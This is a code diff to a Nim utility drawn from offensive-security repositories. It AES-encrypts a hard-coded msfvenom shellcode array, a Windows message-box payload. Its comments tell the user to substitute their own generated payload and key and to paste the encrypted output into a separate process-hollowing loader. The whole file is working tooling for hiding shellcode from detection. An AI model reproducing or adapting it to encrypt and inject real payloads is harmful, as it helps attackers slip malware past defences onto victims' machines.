@@ -1,6 +1,9 @@
 #[
     Reference: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/encrypt_decrypt_bin.nim
+    Reference: https://github.com/S3cur3Th1sSh1t/Creds/blob/master/nim/encrypt_shellcode.nim
 
+  - Replace shellcode and envkey below with your generated payload and key
+  - Run this program and copy the IV, key, and encrypted shellcode to the matching fields in shellcode_hollow_encrypt.nim
 
 ]#
 
@@ -12,7 +15,7 @@ func toByteSeq*(str: string): seq[byte] {.inline.} =
   ## Converts a string to the corresponding byte sequence.
   @(str.toOpenArrayByte(0, str.high))
 
-
+# msfvenom -p windows/x64/messagebox -f csharp
 var shellcode: array[293, byte] = [
   byte 0xfc,0x48,0x81,0xe4,0xf0,0xff,
   0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
@@ -43,7 +46,7 @@ var shellcode: array[293, byte] = [
 
 var
   data: seq[byte] = toByteSeq(encode(shellcode))
-  envkey: string = "flikk.local"
+  envkey: string = "flikk"
 
   ectx, dctx: CTR[aes256]
   key: array[aes256.sizeKey, byte]
@@ -67,12 +70,12 @@ ectx.init(key, iv)
 ectx.encrypt(plaintext, enctext)
 ectx.clear()
 
-dctx.init(key, iv)
-dctx.decrypt(enctext, dectext)
-dctx.clear()
+# dctx.init(key, iv)
+# dctx.decrypt(enctext, dectext)
+# dctx.clear()
 
 echo "IV: ", toHex(iv)
 echo "KEY: ", expandedkey
 echo "PLAINTEXT: ", toHex(plaintext)
 echo "ENCRYPTED TEXT: ", toHex(enctext)
-echo "DECRYPTED TEXT: ", toHex(dectext)
+#echo "DECRYPTED TEXT: ", toHex(dectext)
